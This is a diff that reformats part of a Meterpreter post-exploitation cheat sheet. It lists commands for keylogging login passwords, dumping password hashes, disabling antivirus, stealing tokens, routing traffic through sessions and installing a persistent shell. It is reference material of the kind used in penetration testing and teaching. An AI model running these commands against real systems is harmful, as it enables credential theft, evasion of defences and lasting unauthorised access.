@@ -142,25 +142,48 @@ Priv: Timestomp Commands
 
 Run Command Examples
 -------------------
-	Command       			Description
-    -------       			-----------
-    run vnc       			Start the VNC script included with meterpreter to get an interactive VNC session on the target.
-    run keylogrecorder		Log all the keystrokes on the victim. For best results, make sure you are running in explorer.exe. To capture login 
-    						password, run this whilst within winlogon.exe.
-    run checkvm				See if the target machine is running in a virtual machine.
-    run winenum				Retrieve info about the Windows machine such as enviornment variables, user accounts, groups, interfaces, routes, etc
-    run scraper				Downloads detailed system information such as password hashes, network shares, registry hives
-    run getcountermeasure	Checks the security settings on the victim and can disable certain countermeasures.
-    run killav				Disable any AntiVirus processes running on the target system if possible.
+    Command            Description
+    -------            -----------
+    run vnc            Start the VNC script included with meterpreter to get an 
+                       interactive VNC session on the target.
+    run keylogrecorder Log all the keystrokes on the victim. For best results,
+                       make sure you are running in explorer.exe. To capture
+                       login passwords, run this whilst within winlogon.exe.
+    run checkvm        See if the victim is running within a virtual machine.
+    run winenum        Retrieve info about the Windows machine such as 
+                       environment variables, user accounts, groups,
+                       interfaces, routes, etc.
+    run scraper        Downloads detailed system information such as password
+                       hashes, network shares, registry hives.
+    run getcountermeasures Checks the security settings on the victim and 
+                           can disable certain countermeasures.
+    run killav         Disable any AntiVirus processes running on the 
+                       target system if possible.
 
 Other Command Examples
 --------------------------
-    Command       			Description
-    -------       			-----------
-    steal_token 456			Need to load incognito into meterpreter using "use incognito" prior to using this. Steals tokens from the specified
-    						process to try impersonate an account. Check your UID afterwards even if there is an error as it may have still worked.
-  	route add 192.168.1.0 255.255.255.0 3	Route all traffic destined to 192.168.1.0/24 though session 3.
-    load auto_add_route 	Automatically issue additional route commands for any previously unseen subnets whenever a new session is opened. 							So does the above command automatically basically for new discovered subnets.
-    route print 			Print the current routing table (subnet, netmask, and associated session that the traffic will be routed through).
-    run persistence -X *options*	Install a script onto the victim machine that will automatically return a meterpreter shell every time it 
-    								starts.
+    Command              Description
+    -------              -----------
+    steal_token 456      Need to load incognito into meterpreter using
+                         "use incognito" prior to using this. Steals tokens from
+                         the specified process to try impersonate an account. 
+                         Check your UID afterwards even if there is an
+                         error as it may have still worked.
+
+    route add 192.168.1.0 | Route all traffic destined to 192.168.1.0/24 
+    255.255.255.0 3       | though session 3.
+ 	 
+    load auto_add_route  Automatically issue additional route commands
+                         for any previously unseen subnets whenever a
+                         new session is opened. So does the above command
+                         automatically basically for new discovered subnets.
+    
+    route print          Print the current routing table (subnet, netmask, 
+                         and associated exploit session that the traffic will
+                         be routed through).
+
+    run persistence    | Install a script onto the victim machine 
+    -X *options*       | that will automatically return a meterpreter
+                       | shell every time the computer starts.
+                                 
+                                  
